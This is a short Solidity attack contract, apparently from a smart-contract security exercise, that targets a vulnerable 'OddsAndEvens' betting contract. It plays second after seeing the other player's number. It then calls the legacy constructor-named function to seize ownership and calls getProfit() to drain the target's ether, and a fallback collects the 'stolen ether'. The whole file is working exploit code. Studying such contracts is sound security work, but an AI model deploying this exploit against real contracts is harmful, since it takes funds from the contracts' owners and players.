pragma solidity ^0.4.2;

contract AttackOddsAndEvens {
    address public vulnerable;
    address public partner;

    constructor(address _target, address _partner) public {
        vulnerable = _target;
        partner = _partner;
    }

    // Play second, after seeing the first player's number
    function attack(uint numberToWin) public payable {
        require(msg.value == 1 ether);
        vulnerable.call.value(1 ether)(bytes4(keccak256("play(uint256)")), numberToWin);
    }

    // Re-initialize the vulnerable contract to become owner (constructor override)
    function becomeOwner() public {
        vulnerable.call(bytes4(keccak256("OddsAndEvens()")));
    }

    // Drain contract profits after becoming owner
    function drain() public {
        vulnerable.call(bytes4(keccak256("getProfit()")));
    }

    // Fallback to receive stolen ether
    function() public payable {}
}

